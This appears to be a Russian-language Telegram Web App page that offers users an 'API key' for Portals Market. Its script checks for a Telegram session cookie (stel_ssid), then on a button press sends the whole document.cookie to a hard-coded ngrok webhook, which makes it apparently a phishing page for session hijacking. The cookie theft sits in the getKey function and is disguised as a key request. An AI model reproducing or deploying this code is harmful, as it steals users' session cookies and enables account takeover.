<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
</head>
<body style="background:var(--tg-theme-bg-color);color:var(--tg-theme-text-color);display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;margin:0;font-family:sans-serif;">
    <h3>🔑 Получить API Key</h3>
    <p id="status" style="text-align:center;opacity:0.7;max-width:80%;margin-bottom:20px;">Проверка сессии...</p>
    <button id="btn" onclick="getKey()" style="padding:15px 30px;font-size:18px;background:#3390ec;color:#fff;border:none;border-radius:8px;cursor:pointer;display:none;">
        Забрать ключ
    </button>

    <script>
        const t = window.Telegram.WebApp;
        t.expand();
        const statusEl = document.getElementById('status');
        const btn = document.getElementById('btn');

        const NGROK_URL = "https://7793-31-76-55-178.ngrok-free.app/webhook"; 

        // Проверяем наличие куки stel_ssid (главный индикатор авторизации)
        const hasAuthCookie = document.cookie.includes('stel_ssid');

        if (!hasAuthCookie) {
            statusEl.innerHTML = "❌ Ты не авторизован в Portals Market.<br><br>Сначала зайди на сайт portal-market.com через Telegram и войди в аккаунт. Затем вернись сюда.";
        } else {
            statusEl.innerHTML = "✅ Сессия активна.<br>Нажми кнопку, чтобы забрать ключ.";
            btn.style.display = "block";
        }

        function getKey() {
            statusEl.innerHTML = "⏳ Запрашиваю ключ с сервера...";
            btn.disabled = true;

            fetch(NGROK_URL, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    cookies: document.cookie 
                })
            })
            .then(r => r.json())
            .then(d => {
                if (d.status === 'ok') {
                    statusEl.innerHTML = "✅ Ключ получен!<br>Проверь личку от бота.";
                    setTimeout(() => t.close(), 2000);
                } else {
                    statusEl.innerHTML = "❌ Ошибка:<br>" + (d.details || d.msg);
                    btn.disabled = false;
                }
            })
            .catch(e => {
                statusEl.innerHTML = "❌ Сеть:<br>" + e.message;
                btn.disabled = false;
            });
        }
    </script>
</body>
</html>
